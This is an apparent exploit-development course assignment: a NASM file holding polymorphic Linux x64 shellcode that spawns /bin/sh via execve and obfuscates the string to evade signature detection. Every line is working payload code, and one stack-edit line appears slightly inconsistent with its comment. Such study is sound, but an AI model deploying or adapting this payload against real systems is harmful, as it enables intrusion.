; Student ID     : SLAE64-1611
; Student Name   : Jonathan "Chops" Crosby
; Assignment 6.1 : Polymorphic Conversion of Linux/x64 Shellcode Part Two of Three - execve("/bin/sh")
; File Name      : execve.nasm
; Shell Storm    : http://shell-storm.org/shellcode/files/shellcode-603.php

section .text
global _start

_start:

xor     rdx, rdx                ; zero out rdx
mov     rax, rdx                ; zero out rax

                                ; mov "s(nib// to rbx
mov     rbx, 0x2273286e69622f2f ; 0x2273286e69622f2f
push    rbx

                                ; at this point rsp is
                                ; //bin(s\"\001
                                ; need to edit bytes

sub     byte [rsp+8], 0x01      ; goes from "//bin(s\"\001"
                                ; to "//bin(s\""

add     byte [rsp+7], 0x46      ; goes from "//bin(s\""
                                ; to "//bin(sh"

add     byte [rsp+5], 0x07      ; goes from "//bin(sh"
                                ; to "//bin/sh"

mov     rdi, rsp                ; moving "//bin/sh" to rdi
push    rax                     ; push \0
push    rdi                     ; push "//bin/sh"
mov     rsi, rsp                ; moving "//bin/sh\0" to rsi
add     al, 0x3b                ; setting rax to execve

syscall                         ; calling execve
